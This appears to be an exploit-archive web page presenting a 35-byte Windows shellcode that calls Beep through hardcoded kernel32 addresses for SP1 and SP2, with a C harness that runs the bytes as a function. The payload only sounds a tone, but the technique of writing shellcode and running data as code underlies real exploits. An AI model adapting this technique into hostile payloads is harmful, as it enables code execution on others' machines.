<html><head><title>Windows - Beep Shellcode (SP1/SP2) - 35 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Shellcode can be changed to work with any windows distribution by changing the address of Beep in kernel32.dll
Addresses for SP1 and SP2

-
*/

#include &lt;stdio.h&gt;

unsigned char beepsp1[] =
&quot;\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC&quot;
&quot;\x10\xC9\xEA\x77&quot;                      //Address \x10\xC9\xEA\x77 = SP1
&quot;\xC7\x44\x24\x04&quot;
&quot;\xE8\x03&quot;                              //Length \xE8\x03 = 1000 (1 second)
&quot;\x00\x00\xC7\x04\x24&quot;
&quot;\xE8\x03&quot;                              //Frequency  \xE8\x03 = 1000
&quot;\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3&quot;;

unsigned char beepsp2[] =
&quot;\x55\x89\xE5\x83\xEC\x18\xC7\x45\xFC&quot;
&quot;\x53\x8A\x83\x7C&quot;                      //Address \x53\x8A\x83\x7C = SP2
&quot;\xC7\x44\x24\x04&quot;
&quot;\xD0\x03&quot;                              //Length \xD0\x03 = 2000 (2 seconds)
&quot;\x00\x00\xC7\x04\x24&quot;
&quot;\x01\x0E&quot;                              //Frequency \x01\x0E = 3585
&quot;\x00\x00\x8B\x45\xFC\xFF\xD0\xC9\xC3&quot;;

int main()
{
    void (*function)();
    *(long*)&amp;function = (long)beepsp1;
    function();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
